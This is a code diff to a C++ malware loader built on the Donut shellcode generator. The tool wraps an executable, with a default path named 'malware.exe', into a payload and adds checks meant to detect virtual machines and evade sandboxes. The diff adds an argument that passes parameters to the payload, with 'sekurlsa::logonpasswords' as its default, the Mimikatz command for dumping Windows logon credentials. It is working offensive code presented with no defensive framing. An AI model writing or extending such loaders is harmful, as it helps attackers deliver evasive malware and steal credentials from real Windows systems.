@@ -15,6 +15,7 @@
 // Struct that will determine the configuration to run this
 
 std::string payload_output = "";
+std::string params = "";
 
 struct Coconut
 {
@@ -51,6 +52,9 @@ int writeShellCode(const char * file)
 	c.ansi = 0;                      // command line will be converted to unicode
 	c.exit = 0;                      // don't call RtlExitUserProcess to terminate host process
 	c.mod_type = DONUT_MODULE_EXE;
+
+	memcpy(c.param, params.data(), params.length());
+
 	memcpy(c.file, file, strlen(file));
 
 	char  * buffer = new char[MAX_BUFFER];
@@ -134,6 +138,7 @@ int main(int argc, char** argv)
 
 		TCLAP::ValueArg<std::string> filepath("f", "file", "Path to file to execute", true, "C:\\Users\\Dev\\Desktop\\malware.exe", "string");
 		TCLAP::ValueArg<std::string> outputname("o", "output", "Output file name", true, "ribeye.exe", "string");
+		TCLAP::ValueArg<std::string> parameters("g", "param", "Parameter to pass to payload", true, "sekurlsa::logonpasswords", "string");
 		TCLAP::ValueArg<int> sleeptime("t", "sleeptime", "How long to sleep for (in ms) if -s is enabled", false , 5000, "integer");
 
 		// Add the argument nameArg to the CmdLine object. The CmdLine object
@@ -141,6 +146,7 @@ int main(int argc, char** argv)
 		cmd.add(filepath);
 		cmd.add(outputname);
 		cmd.add(sleeptime);
+		cmd.add(parameters);
 
 		TCLAP::SwitchArg bAll("e", "all", "Enable all checks with default values", cmd, false);
 		TCLAP::SwitchArg bVirtual("v", "vm", "Detect VM using CPUID", cmd, false);
@@ -180,6 +186,8 @@ int main(int argc, char** argv)
 			coconut.cpu_core = bCore.getValue();;
 
 		}
+
+		params = parameters.getValue();
 
 		std::string targetFile = filepath.getValue();
 
